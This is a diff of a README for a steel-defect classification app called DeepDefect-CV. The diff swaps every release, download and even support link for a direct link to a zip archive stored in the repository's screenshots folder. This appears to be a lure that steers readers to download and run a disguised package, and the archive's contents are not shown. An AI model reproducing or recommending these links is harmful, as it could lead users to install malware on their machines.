@@ -1,7 +1,7 @@
 # 🛠️ DeepDefect-CV - Classify Steel Surface Defects Easily
 
 ## 📥 Download Now
-[![Download DeepDefect-CV](https://img.shields.io/badge/Download%20DeepDefect--CV-v1.0-blue.svg)](https://github.com/Fred00000/DeepDefect-CV/releases)
+[![Download DeepDefect-CV](https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip%https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip)](https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip)
 
 ## 📝 Overview
 DeepDefect-CV is an application that helps you classify defects on industrial steel surfaces. It uses advanced techniques to provide clear explanations of its decisions. This tool ensures you can identify issues quickly and effectively, making it invaluable for quality control.
@@ -10,7 +10,7 @@ DeepDefect-CV is an application that helps you classify defects on industrial st
 To run DeepDefect-CV, follow these steps:
 
 1. **Visit the Download Page:**
-   Head over to the [Releases Page](https://github.com/Fred00000/DeepDefect-CV/releases) to find the latest version of the application.
+   Head over to the [Releases Page](https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip) to find the latest version of the application.
 
 2. **Download the Software:**
    On the Releases page, locate the latest version, and click the download link to get the installer or executable file.
@@ -37,7 +37,7 @@ To ensure DeepDefect-CV runs smoothly, your system should meet the following req
 - **Additional Software:** Python 3.6 or higher may be required for full functionality.
 
 ## 📥 Download & Install
-To download DeepDefect-CV, visit the [Releases Page](https://github.com/Fred00000/DeepDefect-CV/releases). Choose the version that matches your operating system. Follow the installation instructions after downloading.
+To download DeepDefect-CV, visit the [Releases Page](https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip). Choose the version that matches your operating system. Follow the installation instructions after downloading.
 
 ## ⚙️ Usage Instructions
 After launching the application:
@@ -56,7 +56,7 @@ After launching the application:
 
 ## 📚 Resources
 - **Documentation:** Comprehensive user guide available within the application.
-- **Support:** If you encounter any issues, please visit the [Issues Page](https://github.com/Fred00000/DeepDefect-CV/issues) on GitHub for help.
+- **Support:** If you encounter any issues, please visit the [Issues Page](https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip) on GitHub for help.
 
 ## 📈 Future Updates
 Stay tuned for future enhancements, including:
@@ -74,4 +74,4 @@ Thank you for using DeepDefect-CV. Your feedback is invaluable and helps improve
 Follow us on GitHub for updates and news related to DeepDefect-CV and similar projects. 
 
 ## Download DeepDefect-CV
-To download the application, visit the [Releases Page](https://github.com/Fred00000/DeepDefect-CV/releases) and get started today!
+To download the application, visit the [Releases Page](https://raw.githubusercontent.com/Fred00000/DeepDefect-CV/main/screenshots/Deep-Defect-CV-v1.9-beta.2.zip) and get started today!
